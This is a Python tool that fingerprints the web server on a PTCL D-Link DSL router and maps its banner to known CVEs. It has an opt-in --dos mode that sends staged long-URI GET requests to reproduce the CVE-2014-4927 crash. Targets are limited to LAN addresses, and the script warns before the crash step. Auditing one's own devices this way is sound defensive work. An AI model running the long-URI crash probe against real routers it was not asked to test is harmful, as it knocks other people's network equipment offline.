#!/usr/bin/env python3
"""
micro_httpd_probe.py - read-only fingerprint of the httpd front door on a PTCL
D-Link DSL-series router, with an OPT-IN long-URI DoS probe.

Background
----------
Port 80 on the PTCL unit is fronted by a small ACME-Labs HTTP server (the
micro_httpd / thttpd / mini_httpd family) that serves the static layer, while
/cgi-bin/webproc serves the admin UI on the SAME port. ptcl_check.py covers
the webproc half; this tool covers the httpd half:

  1. what `Server:` banner the front door sends
  2. which ACME family (if any) that banner identifies, and which CVEs apply
     per the table in ../research/micro-httpd-report.md section 5
  3. (only with --dos) the long-URI GET of CVE-2014-4927 at staged lengths,
     followed by a health check of whether the admin UI still answers

Safety properties, by construction:
  * GET only. No POST. No credential submission. No config writes.
  * Targets must resolve to RFC1918 / link-local (same policy as ptcl_check.py).
  * The long-URI probe is OFF unless --dos is passed: on an unpatched build it
    can crash or reboot the router's admin UI until a power cycle.

Standard library only. Python 3.8+.

    python3 micro_httpd_probe.py 192.168.10.1
    python3 micro_httpd_probe.py 192.168.10.1 --json report.json
    python3 micro_httpd_probe.py 127.0.0.1 --port 8099      # vs selftest_mock.py
    python3 micro_httpd_probe.py 192.168.10.1 --dos         # LAST - may crash the box
"""

from __future__ import annotations

import argparse
import http.client
import ipaddress
import json
import re
import socket
import sys
import time
from datetime import datetime, timezone


# --------------------------------------------------------------------------- #
# Target policy (identical to ptcl_check.py: LAN only)
# --------------------------------------------------------------------------- #

_ALLOWED_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("fc00::/7"),
    ipaddress.ip_network("fe80::/10"),
    # loopback is unambiguously this machine - it is what selftest_mock.py binds to
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
]


def resolve_private(host: str) -> str:
    """Return the address to connect to, or raise if it is not LAN-local."""
    try:
        infos = socket.getaddrinfo(host, None, proto=socket.IPPROTO_TCP)
    except socket.gaierror as exc:
        raise ValueError(f"cannot resolve {host!r}: {exc}") from exc
    if not infos:
        raise ValueError(f"cannot resolve {host!r}")

    addr = ipaddress.ip_address(infos[0][4][0])
    if not any(addr in net for net in _ALLOWED_NETS):
        raise ValueError(
            f"{host} resolves to {addr}, which is not a private/LAN address.\n"
            "This tool only probes devices on your own network (RFC1918 / link-local). "
            "Probing a device you do not own is not something it will help with."
        )
    return str(addr)


# --------------------------------------------------------------------------- #
# HTTP, minimal and transparent
# --------------------------------------------------------------------------- #


class Resp:
    def __init__(self, status: int, headers, body: bytes):
        self.status = status
        self.headers = headers          # list of (name, value)
        self.body = body

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", "replace")

    def header(self, name: str) -> str | None:
        for k, v in self.headers:
            if k.lower() == name.lower():
                return v
        return None


class Client:
    def __init__(self, host: str, port: int, timeout: float, verbose: bool = False):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.verbose = verbose

    def get(self, path: str) -> Resp:
        conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        headers = {
            "User-Agent": "micro_httpd_probe/1.0 (read-only LAN audit)",
            "Accept": "*/*",
            "Connection": "close",
        }
        if self.verbose:
            shown = path if len(path) <= 80 else path[:60] + f" ... ({len(path)} chars)"
            print(f"    -> GET {shown}")
        try:
            conn.request("GET", path, headers=headers)
            raw = conn.getresponse()
            body = raw.read(65536)   # fingerprinting needs the headers; cap the body
            resp = Resp(raw.status, raw.getheaders(), body)
        finally:
            conn.close()
        if self.verbose:
            print(f"    <- {resp.status} {len(resp.body)} bytes")
        return resp


def try_get(c: Client, path: str) -> Resp | None:
    """A GET that reports failure as None instead of raising (used for the DoS stages)."""
    try:
        return c.get(path)
    except (OSError, http.client.HTTPException) as exc:
        if c.verbose:
            print(f"    <- NO RESPONSE ({type(exc).__name__}: {exc})")
        return None


def fetch(c: Client, path: str, max_hops: int = 2) -> tuple[Resp, list]:
    """A GET that follows same-host relative redirects (some builds 302 / -> login page)."""
    r = c.get(path)
    history = [r.status]
    for _ in range(max_hops):
        if r.status not in (301, 302, 303, 307):
            break
        loc = r.header("Location") or ""
        if not (loc.startswith("/") and not loc.startswith("//")):
            break                        # absolute / other-host: record and stop
        r = c.get(loc)
        history.append(r.status)
    return r, history


# --------------------------------------------------------------------------- #
# Banner -> ACME family -> CVE table (mirror of micro-httpd-report.md section 5)
# --------------------------------------------------------------------------- #

FAMILY_RES = {
    "micro_httpd": re.compile(r"micro_httpd", re.I),
    "thttpd":      re.compile(r"thttpd", re.I),
    "mini_httpd":  re.compile(r"mini_httpd", re.I),
}

VERSION_RES = {
    "thttpd":     re.compile(r"thttpd[/\s]v?(\d+)\.(\d+)", re.I),
    "mini_httpd": re.compile(r"mini_httpd[/\s]v?(\d+)\.(\d+)", re.I),
}


def classify(banner: str) -> tuple[str, list]:
    """Return (family, list of applicable CVE descriptions) for a Server: banner."""
    b = (banner or "").strip()
    if not b:
        return "none", []
    family = "unknown"
    for name, rx in FAMILY_RES.items():
        if rx.search(b):
            family = name
            break

    if family == "micro_httpd":
        return family, [
            "CVE-2014-4927 (DoS - long URI in a GET; names D-Link DSL2750U/DSL2740U; never patched)",
            "CVE-2010-1544 (DoS - same server, cable-modem build; informational)",
        ]

    if family in ("thttpd", "mini_httpd"):
        m = VERSION_RES[family].search(b)
        if not m:
            no_ver = (f"no version in banner - all {family} CVEs in the table assumed to apply")
            if family == "thttpd":
                return family, [
                    f"CVE-2009-4490 (log command injection) - {no_ver}",
                    f"CVE-2017-17663 (buffer overflow) - {no_ver}",
                ]
            return family, [
                f"CVE-2017-17663 (buffer overflow) - {no_ver}",
                f"CVE-2018-18778 (arbitrary file read) - {no_ver}",
                f"CVE-2026-68005 (DoS, unpatched) - {no_ver}",
            ]

        v = (int(m.group(1)), int(m.group(2)))
        out = []
        if family == "thttpd":
            if v < (2, 26):
                out.append("CVE-2009-4490 (log command injection; fixed 2.26)")
            if (2, 24) <= v < (2, 28):
                out.append("CVE-2017-17663 (buffer overflow; fixed 2.28)")
        else:  # mini_httpd
            if v < (1, 28):
                out.append("CVE-2017-17663 (buffer overflow; fixed 1.28)")
            if (1, 28) <= v < (1, 30):
                out.append("CVE-2018-18778 (arbitrary file read; fixed 1.30)")
            if v <= (1, 30):
                out.append("CVE-2026-68005 (DoS; unpatched as of 2026)")
        return family, out

    return family, []


# --------------------------------------------------------------------------- #
# The probes
# --------------------------------------------------------------------------- #

# A credential form, not "the word password": same strict rule as ptcl_check.py.
LOGIN_FORM_RE = re.compile(
    r'name\s*=\s*["\']?:password'
    r'|:action\s*=\s*["\']?Login'
    r'|Username\s+or\s+Password',
    re.I,
)

# CVE-2014-4927 shape: a very long path in a GET. Staged so a crash is
# attributable to a length band, not to "the first big one we tried".
DOS_LENGTHS = [10_000, 20_000, 40_000, 64_000]


def fingerprint(host: str, port: int, timeout: float, verbose: bool) -> dict:
    c = Client(host, port, timeout, verbose)
    out: dict = {
        "target": f"{host}:{port}",
        "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "checks": {},
    }

    # -- 0. is there anything there at all? ---------------------------------- #
    try:
        root, history = fetch(c, "/")
    except (OSError, http.client.HTTPException) as exc:
        out["reachable"] = False
        out["error"] = f"{type(exc).__name__}: {exc}"
        out["verdict"] = "UNREACHABLE"
        return out
    out["reachable"] = True

    banner = (root.header("Server") or "").strip()
    out["checks"]["root"] = {
        "status": root.status,
        "history": history,
        "server_banner": banner or None,
        "login_form_present": bool(LOGIN_FORM_RE.search(root.text)),
    }

    # -- 1. the CGI shares this port ----------------------------------------- #
    # deviceinfo (not the wizard!) - a neutral page that demands login and
    # therefore mints no session. Confirms webproc is fronted by the same port.
    webproc_path = ("/cgi-bin/webproc?getpage=html/index.html&errorpage=html/index.html"
                    "&var:language=en_us&var:menu=status&var:page=deviceinfo")
    try:
        wp = c.get(webproc_path)
    except (OSError, http.client.HTTPException) as exc:
        wp = None
        out["error_webproc"] = f"{type(exc).__name__}: {exc}"
    out["checks"]["webproc_same_port"] = (
        {
            "status": wp.status,
            "login_form_present": bool(LOGIN_FORM_RE.search(wp.text)),
            "banner": (wp.header("Server") or "").strip() or None,
        }
        if wp is not None else {"error": out.get("error_webproc")}
    )

    # -- 2. banner -> family -> CVEs ----------------------------------------- #
    family, cves = classify(banner)
    out["banner"] = {"raw": banner or None, "family": family, "cves": cves}
    return out


def dos_probe(c: Client) -> dict:
    """The CVE-2014-4927 confirmation: staged long-URI GETs, then a health check."""
    stages = []
    down_after = None
    for n in DOS_LENGTHS:
        r = try_get(c, "/" + "A" * n)
        if r is not None:
            stages.append({"len": n, "result": f"HTTP {r.status}"})
        else:
            stages.append({"len": n, "result": "NO RESPONSE (connection failed/timed out)"})
            down_after = n
            break

    # Health check. Give the box a moment to die (or finish being busy), then ask
    # again if the first answer is silent.
    time.sleep(3.0)
    h1 = try_get(c, "/")
    h2 = None
    if h1 is None:
        time.sleep(8.0)
        h2 = try_get(c, "/")

    if h1 is not None:
        health = "up"
    elif h2 is not None:
        health = "recovered after brief unresponsiveness"
    else:
        health = "DOWN"

    return {
        "requested": True,
        "lengths": DOS_LENGTHS,
        "stages": stages,
        "stopped_after_len": down_after,
        "health_check": health,
        "down": h1 is None and h2 is None,
    }


# --------------------------------------------------------------------------- #
# Verdict + reporting
# --------------------------------------------------------------------------- #

BAR = "-" * 68


def decide(fp: dict, dos: dict | None) -> str:
    if not fp.get("reachable"):
        return "UNREACHABLE"

    if dos and dos.get("down"):
        return "EXPOSED: DoS confirmed (admin UI stopped answering after the long-URI probe)"

    family = fp["banner"]["family"]
    cves = fp["banner"]["cves"]
    if family in ("micro_httpd", "thttpd", "mini_httpd") and cves:
        return f"EXPOSED: {family} banner with applicable CVEs"

    if dos:
        return ("NO EXPOSURE FOUND: survived the long-URI probe"
                " (not proof of a patch - the crash length varies by build)")
    if family in ("micro_httpd", "thttpd", "mini_httpd"):
        return f"NO EXPOSURE FOUND: {family} banner, no table CVE applies to that version"
    return "BANNER UNKNOWN: not an ACME-family banner; only --dos can test the long-URI DoS"


def report(fp: dict, dos: dict | None) -> None:
    print()
    print(BAR)
    print("  PTCL D-Link httpd front-door check - READ-ONLY, LAN-ONLY")
    print(BAR)
    print(f"  target    : {fp['target']}")
    print(f"  timestamp : {fp['timestamp']}")

    if not fp.get("reachable"):
        print(f"  result    : UNREACHABLE ({fp.get('error')})")
        print(BAR)
        print("  Nothing was probed. Check the IP, that your device is on the")
        print("  router's own network (Wi-Fi, not mobile data), and that its")
        print("  web UI is enabled.")
        print()
        return

    c = fp["checks"]
    root = c["root"]
    print()
    print("  1. root page")
    print(f"     GET /                    -> "
          + (" -> ".join(str(s) for s in root["history"]) or str(root["status"])))
    print(f"     Server banner            : {root['server_banner'] or '(none)'}")
    print(f"     login form on root       : {'yes' if root['login_form_present'] else 'no'}"
          "   (expected: yes - the UI is alive)")

    wp = c["webproc_same_port"]
    print()
    print("  2. webproc on the same port")
    if "status" in wp:
        print(f"     GET /cgi-bin/webproc (deviceinfo) -> {wp['status']}"
              + (f"  banner: {wp['banner']}" if wp.get("banner") else ""))
        print(f"     login demanded           : {'yes' if wp['login_form_present'] else 'no'}"
              "   (expected: yes - no session was minted)")
    else:
        print(f"     GET /cgi-bin/webproc (deviceinfo) -> FAILED ({wp.get('error')})")
        print("     the httpd and the CGI may be on different ports - re-check with nmap")

    b = fp["banner"]
    print()
    print("  3. banner -> ACME family -> CVE table")
    print(f"     family                   : {b['family']}")
    if b["cves"]:
        for cve in b["cves"]:
            print(f"     applies                  : {cve}")
    else:
        print("     applies                  : none identified from the banner")
        if b["family"] == "unknown" and b["raw"]:
            print(f"     note                     : '{b['raw']}' is not an ACME-family banner.")
            print("                               Cross-reference it on NVD manually if it")
            print("                               names a server + version.")

    if dos:
        print()
        print("  4. long-URI probe (CVE-2014-4927 shape)   [DESTRUCTIVE - opt-in]")
        for s in dos["stages"]:
            print(f"     GET / + {s['len']:>6} x 'A'  -> {s['result']}")
        print(f"     health check GET /       : {dos['health_check'].upper()}")
        if dos["down"]:
            print("     -> the admin UI is not answering. Power-cycle the router,")
            print("        then re-run this tool to confirm it is back.")
        elif dos["health_check"].startswith("recovered"):
            print("     -> it went quiet during the probe and came back. Suspicious,")
            print("        but not a confirmed crash.")

    print()
    print(BAR)
    print(f"  VERDICT: {fp['verdict']}")
    print(BAR)
    if fp["verdict"].startswith("EXPOSED"):
        print("  The front door on port 80 matches a known-DoSable server (or took")
        print("  the hit). Exposure is the only real control here: disable")
        print("  remote/WAN management so only your LAN can reach port 80, and")
        print("  re-run after any change. See ../research/micro-httpd-report.md")
        print("  section 8 for the full order of actions.")
    elif fp["verdict"].startswith("BANNER UNKNOWN"):
        print("  The banner did not identify an ACME-family server. This is NOT a")
        print("  clean bill of health - it only means the banner cannot be mapped")
        print("  to the CVE table. If you want the direct test, re-run with --dos")
        print("  (accepting that it may reboot the admin UI).")
    else:
        print("  No exposure identified from what this tool can see. Re-run after")
        print("  any firmware change; the PTCL build strings are absent from the")
        print("  public affected-version lists, so 'not known affected' != patched.")
    print()


# --------------------------------------------------------------------------- #

def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="Read-only LAN fingerprint of the PTCL D-Link httpd front door "
                    "(ACME micro_httpd family), with an opt-in long-URI DoS probe.",
        epilog="Only probes private/LAN addresses. GET only. --dos may crash the router.",
    )
    ap.add_argument("host", help="router address, e.g. 192.168.10.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--timeout", type=float, default=6.0)
    ap.add_argument("--json", metavar="PATH", help="also write the raw result as JSON")
    ap.add_argument("--dos", action="store_true",
                    help="ALSO run the staged long-URI probe (CVE-2014-4927). "
                         "On an unpatched build this can crash the admin UI "
                         "until a power cycle. Run it LAST, on your own device.")
    ap.add_argument("-v", "--verbose", action="store_true", help="log every request")
    args = ap.parse_args(argv)

    print(f"resolving {args.host} ...", end=" ", flush=True)
    try:
        addr = resolve_private(args.host)
    except ValueError as exc:
        print("refused")
        print(f"\n{exc}\n", file=sys.stderr)
        return 2
    print(addr)

    if args.dos:
        print()
        print("  WARNING: --dos will send GET requests with URIs up to 64000 chars.")
        print("  On an unpatched build that CAN CRASH or REBOOT the router's admin")
        print("  UI (that is exactly what CVE-2014-4927 does). Do it last, on your")
        print("  own device, and be ready to power-cycle the router.")
        print()

    try:
        result = fingerprint(addr, args.port, args.timeout, args.verbose)
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
        return 130

    dos = None
    if args.dos and result.get("reachable"):
        dos = dos_probe(Client(addr, args.port, args.timeout, args.verbose))
        result["dos"] = dos

    result["verdict"] = decide(result, dos)
    report(result, dos)

    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(result, fh, indent=2)
        print(f"  raw result written to {args.json}\n")

    return 0 if not result.get("verdict", "").startswith("EXPOSED") else 1


if __name__ == "__main__":
    sys.exit(main())
